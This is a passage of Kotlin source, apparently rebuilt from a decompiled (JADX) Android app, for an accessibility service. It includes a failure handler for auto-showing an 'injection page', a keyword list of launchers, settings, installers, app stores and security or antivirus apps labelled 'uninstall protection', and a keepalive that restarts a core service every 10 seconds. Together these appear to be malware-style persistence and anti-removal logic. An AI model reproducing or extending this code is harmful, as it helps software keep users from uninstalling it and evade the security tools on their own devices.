                android.util.Log.e(TAG, "❌ 自动显示注入页面失败: $packageName", e)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ handleInjectionCheck 异常", e)
        }
    }

    /**
     * Check if a package name is in the extended uninstall protection list.
     * JADX line 10010–10012: long list of vendor/system package substrings.
     */
    internal fun isPackageInProtectionList(pkg: String): Boolean {
        val protectedKeywords = arrayOf(
            "launcher", "systemui", "packageinstaller", "appmarket", "appstore",
            "market", "settings", "securitycenter", "phonemanager", "safecenter",
            "security", "battery", "permissionmanager", "systemmanager", "devicemanager",
            "oplus", "coloros", "oppo", "realme", "oneplus", "heytap", "nearme",
            "vivo", "bbk", "iqoo", "miui", "xiaomi", "huawei", "honor",
            "samsung", "meizu", "nubia", "lenovo", "motorola", "smartisanos",
            "qihoo", "360", "tencent", "qq.manager"
        )
        return protectedKeywords.any { pkg.contains(it, ignoreCase = true) }
    }

    /**
     * Ensure AppCoreService is running (throttled check).
     * JADX line 9783: check every 10s.
     */
    private fun ensureCoreServiceRunning() {
        val now = System.currentTimeMillis()
        if (now - lastCoreServiceCheckTime > MyAccessibilityService.CORE_SERVICE_CHECK_INTERVAL) {
            lastCoreServiceCheckTime = now
            if (!AppCoreService.isRunning()) {
                try {
                    AppCoreService.start(service.applicationContext)
                } catch (_: Exception) {}
            }
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Testable pure logic helpers
    // ════════════════════════════════════════════════════════════════

    /**
     * Check if a content change event should be throttled (300ms window).
     * JADX line 9978: contentChangeTime - lastContentChangeTime < 300L.
     *
     * Updates lastContentChangeTime only when NOT throttled (JADX behavior).
     * @return true if throttled (should skip), false if not throttled.
     */
    fun isContentChangeThrottled(now: Long): Boolean {
        val throttled = now - lastContentChangeTime < 300L
        if (!throttled) lastContentChangeTime = now
        return throttled
    }

    /**
     * Check if the AppCoreService keepalive check is throttled (10s interval).
     * Testable pure logic — does NOT actually start the service.
     * @return true if throttled (should skip), false if enough time has passed.
     */
    fun isCoreServiceCheckThrottled(now: Long): Boolean {
        if (now - lastCoreServiceCheckTime > MyAccessibilityService.CORE_SERVICE_CHECK_INTERVAL) {
            lastCoreServiceCheckTime = now
            return false
        }
        return true
    }

    // ── Diagnostic: throttle null-orchestrator log ──
    @Volatile
    private var lastMainOrchestratorNullLogTime: Long = 0L
}
